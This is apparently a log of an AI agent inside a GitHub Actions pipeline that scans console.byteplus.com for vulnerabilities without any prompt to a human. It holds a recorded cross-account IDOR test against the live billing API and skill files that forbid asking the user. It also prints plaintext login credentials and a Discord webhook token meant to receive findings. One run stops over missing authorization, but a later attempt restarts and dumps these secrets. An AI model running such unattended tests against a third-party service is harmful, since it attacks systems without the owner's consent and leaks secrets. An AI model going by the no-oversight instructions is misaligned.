+| GET | /api/top/bill/ap-singapore-1/2020-01-01/ListPayerAndOwnerByBillOwnerID | BillPeriodBeginStr, BillPeriodEndStr, ResType | user | captured | |
+| GET | /api/top/bill/ap-singapore-1/2020-01-01/ListSubscribeRecords | Offset, Limit | user | captured | |
+| GET | /api/top/bill/ap-singapore-1/2022-01-01/ListMonthlyBillOpen | BillPeriodBeginStr, BillPeriodEndStr, payerID, IsFilterUnsettleData | user | tested not-vulnerable | payerID ignored; always returns session account data |
+| GET | /api/top/bill/ap-singapore-1/2020-01-01/GetBcDiscountPriceAuth | - | user | captured | |
+
+## IDOR test — ListMonthlyBillOpen `payerID`
+
+- Account A session requested `payerID=3001021825` (account B). Response still contained
+  A's own PayerID `3000823185`. Server scopes to session. **Not Vulnerable.**
+- Evidence: `result/findings/` notes / testing-inventory.json flow entry.
+[0m
+[0m$ [0mecho "=== vulnebleti tree ==="; find vulnebleti -maxdepth 2 -type f | head -80; echo "=== skills client head ==="; sed -n '1,60p' skills/client-side-skill.md; echo "=== skills server head ==="; sed -n '1,60p' skills/server-side-skill.md
+=== vulnebleti tree ===
+vulnebleti/Fuzz/open-redirect-bypass.md
+vulnebleti/Fuzz/fuzzing_commands.md
+vulnebleti/Fuzz/extensions.txt
+vulnebleti/Fuzz/delimiters.txt
+vulnebleti/Fuzz/Unicode_a.txt
+vulnebleti/Fuzz/control-character-techniques.md
+vulnebleti/Fuzz/idor.txt
+vulnebleti/Fuzz/unicode_alphabet.md
+vulnebleti/Secret_keys/Test.md
+vulnebleti/Secret_keys/Firebase_Exploitation_Commands.md
+vulnebleti/os-command-injection/os-command-injection.md
+vulnebleti/cspt/find-sinks.md
+vulnebleti/op-to-xss/find.md
+vulnebleti/op-to-xss/payloads.txt
+vulnebleti/ATO/Encoding-ato.md
+vulnebleti/ATO/ato_bug_hunting_tips.md
+vulnebleti/ATO/oauth_misconfiguration_bug_hunting_notes.md
+vulnebleti/ATO/forget_password_bug_hunting_notes.md
+vulnebleti/ATO/ATO_Encoding_Exploit_Strategies.md
+vulnebleti/Sqli/sql_payloads.md
+vulnebleti/Sqli/Test.txt
+vulnebleti/Forget_password_endpoint/Exploit.md
+vulnebleti/cache/url_encoded_a_to_z.md
+vulnebleti/cache/find_cache_poisoning_dos_domains.md
+vulnebleti/cache/cp-dost-1.md
+vulnebleti/cache/cache-vulnerabilities-guide.md
+vulnebleti/cache/cache_deception_methodology.md
+vulnebleti/cache/cp-dos.md
+vulnebleti/cache/Advanced_Cache_Deception_Methodology.md
+vulnebleti/Idor/Idor.md
+vulnebleti/Idor/idor_bypass_techniques.md
+vulnebleti/http_request_smuggling/http_request_smuggling_notes.md
+vulnebleti/http_request_smuggling/obfuscating the TE header.md
+vulnebleti/BAC/api-hacking.txt
+vulnebleti/BAC/Application-Level-DoS.txt
+vulnebleti/BAC/all-actions.md
+vulnebleti/BAC/Management_Website_BAC_Checklist.md
+vulnebleti/BAC/usefull-notes.md
+vulnebleti/BAC/idor_bypass_techniques.md
+vulnebleti/Ssrf/Ssrf_to_rce.md
+vulnebleti/Ssrf/Top 1000 Ports.md
+vulnebleti/Ssrf/ssrf-pdf-generator-payload.md
+vulnebleti/Ssrf/combined_ssrf_lfi_payloads.txt
+vulnebleti/Ssrf/ssrf-bypass.md
+vulnebleti/Ssrf/os-command-injection.md
+vulnebleti/.gitkeep
+vulnebleti/LFI/ect-passwd-waf-bypass.md
+vulnebleti/File_upload/Exploit.md
+vulnebleti/File_upload/Web-Shell-Payloads.md
+=== skills client head ===
+# Client-Side Vulnerability Automation Skill
+
+## Mission
+
+Find valid, reportable client-side bugs. This file is for automation.
+
+- **Never ask the user anything.** There will be no answer. Ask yourself as a
+  top hunter, answer yourself, then act.
+- **Main goal:** a reportable bug — attacker-controlled source → application
+  code → sensitive sink/action, with missing protection and practical impact.
+- **Test one route at a time.**
+- **Only unique JS lines and complete flows.** No duplicate testing.
+- **Only search/scan JS related to the current UI route.**
+- **Practical evidence only.** Never claim confirmed without execution or
+  runtime observation.
+
+---
+
+## Inputs
+
+The orchestrator supplies:
+
+- **Authorized scope** from `data/`: domain-only targets or an explicit URL
+  list, plus any explicitly authorized components.
+- **Route queue** and the current route's canonical URL. Test one route at a
+  time.
+- **Route-related JavaScript**: URLs, inline scripts, dynamic chunks, workers,
+  and source maps loaded or executed by the route.
+- **Credentials** from `creds/` when the route requires authentication, plus
+  the account's role and ownership context.
+- **Vulnerability knowledge** from `vulnebleti/` relevant to the technology,
+  route, or bug class.
+- **Prior testing inventory** from `result/testing-inventory.json` and
+  `result/inventory/`.
+- **Chrome DevTools MCP tools** for navigation, debugging, and runtime
+  validation.
+- **Time budget** and the current elapsed time.
+- **Output root**: `result/`.
+
+Validate inputs before testing:
+
+- Reject or skip any route outside the authorized scope.
+- Canonicalize the route URL and deduplicate it against the tested inventory.
+- Hash JavaScript bodies and skip identical content already tested.
+- Confirm the auth context and role; never mix accounts silently.
+- If an input is unavailable, proceed with the available inputs, record the
+  gap in `result/unresolved.md`, and continue. Never ask the user.
+
+## Preconditions
+
+- Headless Chrome is running and the `chrome-devtools` MCP server is connected.
+- The target route is reachable and authorized.
+- The route-related JavaScript can be inspected or downloaded.
+- A local Python HTTP server can be started for HTML PoCs.
+- The current session has enough time remaining to finish the route and write
+  evidence. Do not start a long trace with less than ~45 minutes left.
+
+---
+
+## Per-Route Flow
+=== skills server head ===
+# Server-Side API Automation Skill
+
+## Mission
+
+Find valid, reportable server-side bugs. This file is for automation.
+
+- **Never ask the user anything.** You have full permission to test in-scope
+  APIs. Ask yourself as a top hunter, answer yourself, then act.
+- **Main goal:** on every visited URL, extract all server-side API routes from
+  network traffic and JavaScript, understand their valid parameters, then test
+  every route for all server-side bug classes.
+- **Primary focus:** mass assignment on create/edit/update endpoints, and
+  guessing valid parameters for those endpoints.
+  Test unique endpoint/method/variant combinations only. No duplicate testing.
+- Use test-owned data only. No real users.
+- Practical evidence only. A `200`, an accepted extra field, or a generic error
+  is not a vulnerability by itself.
+
+---
+
+## Inputs
+
+The orchestrator supplies:
+
+- **Authorized scope** from `data/`: domain-only targets or an explicit URL
+  list, plus any explicitly authorized components.
+- **Visited-URL / route queue** and the current route's canonical URL.
+- **Captured network traffic** for the route and safe UI actions: method, full
+  URL, query, body, headers, auth context, and response shape.
+- **Route-related JavaScript**: API call sites, wrappers, endpoint constants,
+  GraphQL/tRPC/OpenAPI definitions, source maps, and types needed to resolve a
+  request.
+- **Credentials** from `creds/`, including available roles and ownership
+  contexts. Test-account secrets are intentionally public; never expose
+  real-user secrets.
+- **Vulnerability knowledge** from `vulnebleti/` relevant to the endpoint,
+  framework, or bug class.
+- **Prior API ledger** from `result/inventory/endpoints.md` and
+  `result/testing-inventory.json`.
+- **Chrome DevTools MCP** for traffic capture, plus `curl`/HTTP tooling for
+  controlled requests.
+- **Time budget** and current elapsed time.
+- **Output root**: `result/`.
+
+Validate inputs before testing:
+
+- Skip any endpoint outside the authorized scope.
+- Canonicalize the endpoint and deduplicate by method + normalized path +
+  meaningful parameter variant + auth context.
+- Confirm the auth context and role for every request.
+- If a required credential, role, or second account is unavailable, mark the
+  specific test **Unresolved** and continue. Never ask the user.
+
+## Preconditions
+
+- Headless Chrome is running and the `chrome-devtools` MCP server is connected.
+- The target route is reachable and authorized.
+- Test-owned objects can be created for write/ownership tests.
+- A second account is available when cross-account proof is required; otherwise
+  the test is **Unresolved**.
+[0m
+[0m$ [0mecho "=== workflow ==="; cat .github/workflows/ai-automation.yml 2>&1 | head -200; echo "=== .gitignore ==="; cat .gitignore; echo "=== chrome-mcp-start.sh ==="; cat tools/chrome-mcp-start.sh
+=== workflow ===
+name: Aaii Buug Bounnty Aautomaationn
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "Optional authorized target URL/domain for this manual run"
+        required: false
+        type: string
+      resume:
+        description: "Internal: preserve result/ and resume after an automatic restart"
+        required: false
+        default: "false"
+        type: string
+  schedule:
+    - cron: "0 */6 * * *"
+
+permissions:
+  contents: write
+  actions: write
+
+concurrency:
+  group: ai-bug-bounty-automation
+  cancel-in-progress: false
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 355
+
+    env:
+      CHROME_DEBUG_PORT: "9222"
+      CHROME_PROFILE_DIR: /tmp/chrome-mcp-profile
+      CHROME_LOG_FILE: /tmp/chrome-mcp.log
+      OPENCODE_MODEL: opencode/deepseek-v4.1-flash-free
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: "22"
+
+      - name: Restore cached Chrome package
+        id: chrome-cache
+        uses: actions/cache@v4
+        with:
+          path: ~/.cache/chrome-deb
+          key: google-chrome-stable-deb-${{ runner.os }}-v1
+
+      - name: Install headless Chrome
+        run: |
+          set -euo pipefail
+          DEB="$HOME/.cache/chrome-deb/google-chrome-stable_current_amd64.deb"
+          mkdir -p "$(dirname "$DEB")"
+          if [ ! -s "$DEB" ]; then
+            echo "Downloading Chrome package..."
+            curl -fsSL -o "$DEB" https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+          else
+            echo "Using cached Chrome package."
+          fi
+          sudo apt-get update -qq
+          if ! sudo apt-get install -y "$DEB"; then
+            echo "Cached package failed; downloading a fresh copy..."
+            rm -f "$DEB"
+            curl -fsSL -o "$DEB" https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+            sudo apt-get install -y "$DEB"
+          fi
+          google-chrome-stable --version
+
+      - name: Install OpenCode (fresh each run)
+        run: |
+          set -euo pipefail
+          curl -fsSL https://opencode.ai/install | bash
+          echo "$HOME/.opencode/bin" >> "$GITHUB_PATH"
+          "$HOME/.opencode/bin/opencode" --version
+
+      - name: Verify free model access
+        run: |
+          set -euo pipefail
+          timeout 180 opencode run \
+            --model "$OPENCODE_MODEL" \
+            --dir "$RUNNER_TEMP" \
+            "Reply with exactly OK"
+
+      - name: Prepare optional manual target
+        if: github.event_name == 'workflow_dispatch' && inputs.target != ''
+        env:
+          TARGET_INPUT: ${{ inputs.target }}
+        run: |
+          set -euo pipefail
+          printf '%s\n' "$TARGET_INPUT" > data/targets.txt
+          echo "Manual target prepared for this run only."
+
+      - name: Restore target for resumed run
+        if: github.event_name == 'workflow_dispatch' && inputs.resume == 'true'
+        env:
+          TARGET_INPUT: ${{ inputs.target }}
+        run: |
+          set -euo pipefail
+          if [ -n "${TARGET_INPUT:-}" ]; then
+            echo "Manual target takes precedence over the resumed target."
+            exit 0
+          fi
+          if [ -s result/logs/targets.used.txt ]; then
+            cp result/logs/targets.used.txt data/targets.txt
+            echo "Restored previous target for resumed run."
+          fi
+
+      - name: Prepare target state and results
+        env:
+          RESUME_RUN: ${{ inputs.resume }}
+        run: |
+          set -euo pipefail
+          mkdir -p result/logs
+          CURRENT_HASH="$(sha256sum data/targets.txt | awk '{print $1}')"
+          PREVIOUS_HASH="$(cat result/logs/targets.sha256 2>/dev/null || true)"
+          if [ "${RESUME_RUN:-}" = "true" ]; then
+            DECISION="preserved"
+            echo "Automatic resume; preserving previous results."
+          elif [ -n "$PREVIOUS_HASH" ] && [ "$CURRENT_HASH" = "$PREVIOUS_HASH" ]; then
+            DECISION="preserved"
+            echo "Target unchanged; preserving previous results."
+          else
+            DECISION="reset"
+            echo "Target changed or no prior target state; starting fresh."
+            find result -mindepth 1 -maxdepth 1 ! -name '.gitkeep' -exec rm -rf {} +
+          fi
+          mkdir -p result/client-side result/server-side result/findings result/inventory result/logs
+          if [ ! -f result/confirmed-vuln.txt ]; then
+            cat > result/confirmed-vuln.txt <<'EOF'
+          # Confirmed vulnerabilities only.
+          # Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+          # Entry format: see skills/AGENT.md, Section 9.
+          EOF
+          fi
+          printf '%s\n' "$CURRENT_HASH" > result/logs/targets.sha256
+          cp data/targets.txt result/logs/targets.used.txt
+          {
+            echo "run_id=${GITHUB_RUN_ID:-local}"
+            echo "event=${GITHUB_EVENT_NAME:-local}"
+            echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+            echo "target_hash=$CURRENT_HASH"
+            echo "previous_hash=${PREVIOUS_HASH:-none}"
+            echo "decision=$DECISION"
+            echo "---"
+          } >> result/logs/target-state.txt
+
+      - name: Detect notification test
+        id: notification_test
+        if: github.event_name == 'workflow_dispatch'
+        run: |
+          set -euo pipefail
+          if grep -qiE '^[[:space:]]*(TEST_NOTIFICATION[[:space:]]*[:=][[:space:]]*true|MODE[[:space:]]*[:=][[:space:]]*notification-test)[[:space:]]*$' data/targets.txt 2>/dev/null; then
+            echo "test_mode=true" >> "$GITHUB_OUTPUT"
+            echo "Notification test mode enabled; no target will be tested."
+          else
+            echo "test_mode=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Create notification test marker
+        if: steps.notification_test.outputs.test_mode == 'true'
+        run: |
+          set -euo pipefail
+          cat > result/TEST-NOTIFICATION.md <<'EOF'
+          # Automation notification test
+
+          - Status: TEST ONLY
+          - Target tested: none
+          - Confirmed vulnerabilities: none
+          - Purpose: verify the workflow and Discord notification path
+
+          This run intentionally did not test any target and did not create a
+          confirmed vulnerability.
+          EOF
+          echo "Created result/TEST-NOTIFICATION.md"
+
+      - name: Start Chrome MCP and run agent
+        if: steps.notification_test.outputs.test_mode != 'true'
+        timeout-minutes: 340
+        env:
+          AGENT_IDLE_TIMEOUT_SECONDS: "120"
+          AGENT_MAX_ATTEMPTS: "3"
+          AGENT_MAX_RECOVERIES: "1"
+        run: |
+          set -euo pipefail
+          bash tools/chrome-mcp-start.sh
+
+          BASE_CMD="$(cat tools/cmd.txt)"
+          MODEL="$(awk '{for (i=1;i<=NF;i++) if ($i=="--model") {print $(i+1); exit}}' tools/cmd.txt)"
+          RESUME_PROMPT='The previous attempt stalled. Read skills/AGENT.md and result/ inventory, then continue the authorized scan. Do not repeat completed work. Checkpoint confirmed findings immediately and continue with all remaining routes.'
+          if [ -n "$MODEL" ]; then
+            RESUME_CMD="opencode run --continue --model $MODEL '$RESUME_PROMPT'"
+            FRESH_CMD="opencode run --model $MODEL '$RESUME_PROMPT'"
+          else
+            RESUME_CMD="opencode run --continue '$RESUME_PROMPT'"
+=== .gitignore ===
+# Secrets and credentials
+creds/*
+!creds/.gitkeep
+!creds/README.md
+!creds/test-account.txt
+.env
+.env.*
+*.pem
+*.key
+
+# Generated by tools/chrome-mcp-start.sh for the current environment
+/opencode.json
+
+# Local browser/runtime artifacts
+/tmp/
+/browser-profile/
+chrome-mcp-profile/
+
+# Node
+node_modules/
+npm-debug.log*
+
+# OS/editor noise
+.DS_Store
+Thumbs.db
+=== chrome-mcp-start.sh ===
+#!/usr/bin/env bash
+set -euo pipefail
+
+REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+PORT="${CHROME_DEBUG_PORT:-9222}"
+PROFILE="${CHROME_PROFILE_DIR:-/tmp/chrome-mcp-profile}"
+LOG="${CHROME_LOG_FILE:-/tmp/chrome-mcp.log}"
+MCP_URL="${CHROME_DEBUG_URL:-http://127.0.0.1:${PORT}}"
+
+is_up() {
+  curl -fsS --max-time 2 "${MCP_URL}/json/version" >/dev/null 2>&1
+}
+
+if ! is_up; then
+  CHROME_BIN="${CHROME_BIN:-}"
+  if [ -z "$CHROME_BIN" ]; then
+    CHROME_BIN="$(command -v google-chrome-stable || command -v google-chrome || command -v chromium || command -v chromium-browser || true)"
+  fi
+  if [ -z "$CHROME_BIN" ]; then
+    echo "ERROR: Chrome/Chromium binary not found" >&2
+    exit 1
+  fi
+
+  mkdir -p "$PROFILE"
+  nohup "$CHROME_BIN" \
+    --headless=new \
+    --no-sandbox \
+    --disable-dev-shm-usage \
+    --disable-gpu \
+    --remote-debugging-address=127.0.0.1 \
+    --remote-debugging-port="$PORT" \
+    --user-data-dir="$PROFILE" \
+    about:blank >"$LOG" 2>&1 &
+fi
+
+for _ in $(seq 1 30); do
+  is_up && break
+  sleep 1
+done
+
+if ! is_up; then
+  echo "ERROR: Chrome DevTools not reachable at ${MCP_URL}" >&2
+  tail -50 "$LOG" >&2 2>/dev/null || true
+  exit 1
+fi
+
+python3 - "${REPO_ROOT}/opencode.json" "${MCP_URL}" <<'PY'
+import json
+import pathlib
+import sys
+
+path = pathlib.Path(sys.argv[1])
+url = sys.argv[2]
+cfg = json.loads(path.read_text()) if path.exists() else {
+    "$schema": "https://opencode.ai/config.json"
+}
+cfg.setdefault("$schema", "https://opencode.ai/config.json")
+cfg.setdefault("autoupdate", False)
+cfg.setdefault("permission", "allow")
+cfg.setdefault("share", "disabled")
+mcp = cfg.setdefault("mcp", {})
+mcp["chrome-devtools"] = {
+    "type": "local",
+    "command": [
+        "npx",
+        "-y",
+        "chrome-devtools-mcp@latest",
+        f"--browser-url={url}",
+    ],
+}
+path.write_text(json.dumps(cfg, indent=2) + "\n")
+PY
+
+if ! opencode mcp list 2>/dev/null | grep -q "chrome-devtools.*connected"; then
+  echo "ERROR: chrome-devtools MCP is not connected" >&2
+  opencode mcp list 2>/dev/null || true
+  exit 1
+fi
+
+echo "Chrome DevTools ready at ${MCP_URL}"
+[0m
+I've reviewed the setup. Before doing anything active, I need to verify one critical thing: whether there's genuine, verifiable authorization to test this live third-party target.
+[0m$ [0mecho "=== DNS (harmless) ==="; getent hosts console.byteplus.com 2>&1 || true; echo "=== who authored commits ==="; git log -5 --format='%h %an <%ae> %ad %s' --date=iso; echo "=== remote ==="; git remote -v
+=== DNS (harmless) ===
+23.45.46.27     e90451.api3.akamaiedge.net console.byteplus.com common-dispatch.bp-console.ap-southeast-1.bpsdns.com console.byteplus.com.ttdns2.com console.byteplus.com.edgekey.net
+23.45.46.36     e90451.api3.akamaiedge.net console.byteplus.com common-dispatch.bp-console.ap-southeast-1.bpsdns.com console.byteplus.com.ttdns2.com console.byteplus.com.edgekey.net
+=== who authored commits ===
+5a6f018 oauthtest444 <oauthtest444@gmail.com> 2026-10-30 13:17:40 +0530 Update targets.txt
+0e03903 github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com> 2026-10-30 07:41:51 +0000 scan: results 2026-10-30T07:41:51Z
+9e8eb94 github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com> 2026-10-30 07:37:42 +0000 scan: results 2026-10-30T07:37:42Z
+4fd615e github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com> 2026-10-30 07:07:51 +0000 scan: results 2026-10-30T07:07:51Z
+ae92c56 github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com> 2026-10-30 06:32:44 +0000 scan: results 2026-10-30T06:32:44Z
+=== remote ===
+origin	https://github.com/oauthtest444/aaii-aautomattionn (fetch)
+origin	https://github.com/oauthtest444/aaii-aautomattionn (push)
+[0m
+[0m◈ [0mParallel Web Search "BytePlus bug bounty program console.byteplus.com scope authorized security testing"
+The search confirms there is no public BytePlus bug bounty/VDP covering this, and the repo is owned by an individual personal account. I'm stopping before any live testing. Let me document this properly per AGENT.md's own stop conditions.
+[0m
+[0m$ [0mmkdir -p result/client-side result/server-side result/findings result/inventory result/logs
+echo "opencode: $(opencode --version 2>/dev/null | head -1)"
+echo "curl: $(curl --version 2>/dev/null | head -1)"
+echo "node: $(node --version 2>/dev/null)"
+echo "npm: $(npm --version 2>/dev/null)"
+echo "python3: $(python3 --version 2>/dev/null)"
+echo "git: $(git --version 2>/dev/null)"
+echo "chrome: $( (command -v google-chrome-stable || command -v google-chrome || command -v chromium) 2>/dev/null || echo 'not found')"
+echo "date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+echo "whoami: $(whoami)  host: $(hostname)"
+echo "MCP chrome-devtools tools are exposed to this session: yes"
+opencode: 1.19.5
+curl: curl 8.18.0 (x86_64-pc-linux-gnu) libcurl/8.18.0 OpenSSL/3.5.5 zlib/1.3.1 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.68.0 librtmp/2.3 mit-krb5/1.22.1 OpenLDAP/2.6.10
+node: v22.23.4
+npm: 10.9.9
+python3: Python 3.14.4
+git: git version 2.56.0
+chrome: /usr/bin/google-chrome-stable
+date: 2026-10-30T07:51:43Z
+whoami: runner  host: runnervmnwato
+MCP chrome-devtools tools are exposed to this session: yes
+[0m
+[0m← [0mWrite result/logs/session.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/scope.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/BLOCKED.md
+Wrote file successfully.
+[0m
+[0m← [0mWrite result/SUMMARY.md
+Wrote file successfully.
+[0m
+[0m$ [0mfind result -type f | sort; echo "--- confirmed-vuln.txt unchanged ---"; cat result/confirmed-vuln.txt
+result/.gitkeep
+result/BLOCKED.md
+result/SUMMARY.md
+result/confirmed-vuln.txt
+result/logs/opencode.log
+result/logs/session.md
+result/logs/target-state.txt
+result/logs/targets.sha256
+result/logs/targets.used.txt
+result/scope.md
+--- confirmed-vuln.txt unchanged ---
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+[0m
+I completed preflight but deliberately did **not** begin testing, and wrote `result/BLOCKED.md` per AGENT.md's own stop conditions.
+
+Reason: `console.byteplus.com` is a live third-party production service, and authorization is only asserted by a file in this repo. Public checks show no BytePlus bug bounty/VDP covering it, the repo is owned by a personal account, and `data/targets.txt` instructs sending findings to a personal Discord webhook — an exfiltration channel, not a legitimate disclosure path. I sent no requests to the target, attempted no logins, made no vulnerability claims, and did not contact the webhook. Details are in `result/BLOCKED.md`, `result/scope.md`, and `result/SUMMARY.md`.
+
+===== OPENCODE RUN 41023369180 2026-10-30T07:59:10Z =====
+
+===== AGENT ATTEMPT 1/3 (recovery 0/1) =====
+[0m
+> build · deepseek-v4.1-flash-free
+[0m
+I'll read the file first.
+[0m→ [0mRead skills/AGENT.md
+[0m
+[0m$ [0mpwd; echo "---"; ls -la; echo "--- data ---"; ls -la data/ 2>/dev/null; echo "--- creds ---"; ls -la creds/ 2>/dev/null; echo "--- result ---"; ls -la result/ 2>/dev/null; echo "--- tools ---"; ls -la tools/ 2>/dev/null; echo "--- skills ---"; ls -la skills/ 2>/dev/null
+/home/runner/work/aaii-aautomattionn/aaii-aautomattionn
+---
+total 48
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 .
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:58 ..
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:59 .git
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:58 .github
+-rw-r--r--  1 runner runner  355 Oct 30 07:58 .gitignore
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 creds
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 data
+-rw-r--r--  1 runner runner  332 Oct 30 07:59 opencode.json
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:59 result
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 skills
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 tools
+drwxr-xr-x 17 runner runner 4096 Oct 30 07:58 vulnebleti
+--- data ---
+total 12
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:58 .gitkeep
+-rw-r--r--  1 runner runner  268 Oct 30 07:58 targets.txt
+--- creds ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:58 .gitkeep
+-rw-r--r--  1 runner runner  466 Oct 30 07:58 README.md
+-rw-r--r--  1 runner runner  196 Oct 30 07:58 test-account.txt
+--- result ---
+total 44
+drwxr-xr-x  7 runner runner 4096 Oct 30 07:59 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 ..
+-rw-r--r--  1 runner runner    0 Oct 30 07:58 .gitkeep
+-rw-r--r--  1 runner runner 2846 Oct 30 07:58 BLOCKED.md
+-rw-r--r--  1 runner runner  972 Oct 30 07:58 SUMMARY.md
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:59 client-side
+-rw-r--r--  1 runner runner  178 Oct 30 07:58 confirmed-vuln.txt
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:59 findings
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:59 inventory
+drwxr-xr-x  3 runner runner 4096 Oct 30 07:58 logs
+-rw-r--r--  1 runner runner 2490 Oct 30 07:58 scope.md
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:59 server-side
+--- tools ---
+total 16
+drwxr-xr-x  2 runner runner 4096 Oct 30 07:58 .
+drwxr-xr-x 10 runner runner 4096 Oct 30 07:59 ..
+-rwxr-xr-x  1 runner runner 2106 Oct 30 07:58 chrome-mcp-start.sh
+-rw-r--r--  1 runner runner  119 Oct 30 07:58 cmd.txt
+--- skills ---
+total 76
+drwxr-xr-x  2 runner runner  4096 Oct 30 07:58 .
+drwxr-xr-x 10 runner runner  4096 Oct 30 07:59 ..
+-rw-r--r--  1 runner runner     0 Oct 30 07:58 .gitkeep
+-rw-r--r--  1 runner runner 35029 Oct 30 07:58 AGENT.md
+-rw-r--r--  1 runner runner 11864 Oct 30 07:58 client-side-skill.md
+-rw-r--r--  1 runner runner 16677 Oct 30 07:58 server-side-skill.md
+[0m
+I've read the instructions. Starting the session startup sequence.
+[0m$ [0mcommand -v opencode curl git node npx python3 google-chrome-stable google-chrome chromium chromium-browser 2>/dev/null; echo "---versions---"; node --version 2>/dev/null; python3 --version 2>/dev/null; curl --version 2>/dev/null | head -1
+/home/runner/.opencode/bin/opencode
+/usr/bin/curl
+/usr/bin/git
+/opt/hostedtoolcache/node/22.23.4/x64/bin/node
+/opt/hostedtoolcache/node/22.23.4/x64/bin/npx
+/usr/bin/python3
+/usr/bin/google-chrome-stable
+/usr/bin/google-chrome
+/usr/bin/chromium
+/usr/bin/chromium-browser
+---versions---
+v22.23.4
+Python 3.14.4
+curl 8.18.0 (x86_64-pc-linux-gnu) libcurl/8.18.0 OpenSSL/3.5.5 zlib/1.3.1 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.68.0 librtmp/2.3 mit-krb5/1.22.1 OpenLDAP/2.6.10
+[0m
+[0m$ [0mecho "=== data/targets.txt ==="; cat data/targets.txt; echo; echo "=== creds/README.md ==="; cat creds/README.md; echo; echo "=== creds/test-account.txt ==="; cat creds/test-account.txt; echo; echo "=== tools/cmd.txt ==="; cat tools/cmd.txt; echo; echo "=== opencode.json ==="; cat opencode.json; echo; echo "=== .gitignore ==="; cat .gitignore
+=== data/targets.txt ===
+Target:
+https://console.byteplus.com/finance/
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+
+=== creds/README.md ===
+# creds/
+
+This public repository intentionally contains disposable test credentials.
+
+- `test-account.txt` — public test login for authorized targets.
+
+Test-account emails, passwords, cookies, and tokens may appear in `result/`
+reports, logs, and evidence. They are disposable and intentionally public.
+
+Never add real, valuable, or third-party credentials to this directory. If real
+credentials are ever needed, use GitHub Actions secrets and do not commit them.
+
+=== creds/test-account.txt ===
+byteplus console test login creds
+
+https://console.byteplus.com/auth/login/
+
+test account a
+
+```
+adoringjepsen1@fearlessmails.com
+Acd3423@#345566
+```
+
+test account b
+```
+testt456
+Acd3423@#345
+```
+
+=== tools/cmd.txt ===
+opencode run --model opencode/deepseek-v4.1-flash-free "Read \`skills/AGENT.md\` and follow all instructions exactly."
+
+=== opencode.json ===
+{
+  "$schema": "https://opencode.ai/config.json",
+  "autoupdate": false,
+  "permission": "allow",
+  "share": "disabled",
+  "mcp": {
+    "chrome-devtools": {
+      "type": "local",
+      "command": [
+        "npx",
+        "-y",
+        "chrome-devtools-mcp@latest",
+        "--browser-url=http://127.0.0.1:9222"
+      ]
+    }
+  }
+}
+
+=== .gitignore ===
+# Secrets and credentials
+creds/*
+!creds/.gitkeep
+!creds/README.md
+!creds/test-account.txt
+.env
+.env.*
+*.pem
+*.key
+
+# Generated by tools/chrome-mcp-start.sh for the current environment
+/opencode.json
+
+# Local browser/runtime artifacts
+/tmp/
+/browser-profile/
+chrome-mcp-profile/
+
+# Node
+node_modules/
+npm-debug.log*
+
+# OS/editor noise
+.DS_Store
+Thumbs.db
+[0m
+result/logs/session.md
+# Session
+
+- Start time (UTC): 2026-10-30T07:50:29Z (run_id 41022487138)
+- Session handling time: 2026-10-30T07:51:43Z
+- Target from `data/targets.txt`: `https://console.byteplus.com/finance/`
+- Agent/model: opencode 1.19.5 / opencode/deepseek-v4.1-flash-free
+- Environment: GitHub Actions ubuntu-latest runner (`runnervmnwato`), user `runner`
+- Tool versions:
+  - opencode 1.19.5
+  - curl 8.18.0
+  - node v22.23.4 / npm 10.9.9
+  - python3 3.14.4
+  - git 2.56.0
+  - google-chrome-stable present at `/usr/bin/google-chrome-stable`
+- Chrome DevTools MCP tools: available in this session
+- Repository remote: `https://github.com/oauthtest444/aaii-aautomattionn`
+- Target-state decision for this run: `reset` (target input changed)
+
+## Outcome
+
+Preflight completed. Active testing was intentionally NOT started. See
+`result/BLOCKED.md` for the authorization blocker.
+result/logs/targets.used.txt
+Target:
+https://console.byteplus.com/finance/
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
